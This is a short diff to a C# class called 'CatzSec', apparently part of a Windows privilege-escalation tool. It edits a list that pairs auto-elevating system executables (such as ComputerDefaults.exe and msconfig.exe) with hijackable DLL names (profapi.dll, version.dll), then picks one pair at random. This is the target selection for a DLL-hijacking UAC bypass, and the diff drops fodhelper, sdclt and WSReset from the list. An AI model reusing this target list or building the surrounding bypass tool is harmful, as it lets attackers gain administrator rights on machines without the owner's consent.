@@ -23,8 +23,8 @@ public class CatzSec
         }
         
         string windowslocation = Environment.SystemDirectory;
-        var executeables = new List<string> {"ComputerDefaults.exe", "EASPolicyManagerBrokerHost.exe", "fodhelper.exe", "FXSUNATD.exe", "msconfig.exe", "OptionalFeatures.exe", "sdclt.exe",   "systemreset.exe", "SystemSettingsAdminFlows.exe", "WinSAT.exe",  "WSReset.exe"};
-        var dlls = new  List<string>        {"profapi.dll",          "profapi.dll",                    "profapi.dll",   "version.dll",  "version.dll",  "profapi.dll",          "profapi.dll",  "version.dll",    "version.dll",                  "version.dll", "profapi.dll"};
+        var executeables = new List<string> {"ComputerDefaults.exe", "EASPolicyManagerBrokerHost.exe",  "FXSUNATD.exe", "msconfig.exe", "OptionalFeatures.exe", "systemreset.exe", "SystemSettingsAdminFlows.exe", "WinSAT.exe"};
+        var dlls = new  List<string>        {"profapi.dll",          "profapi.dll",                     "version.dll",  "version.dll",  "profapi.dll",          "version.dll",    "version.dll",                  "version.dll"};
         int chosen = new Random().Next(0, dlls.Count()-1);
         string executeable_name = executeables[chosen];
         string dll_name = dlls[chosen];
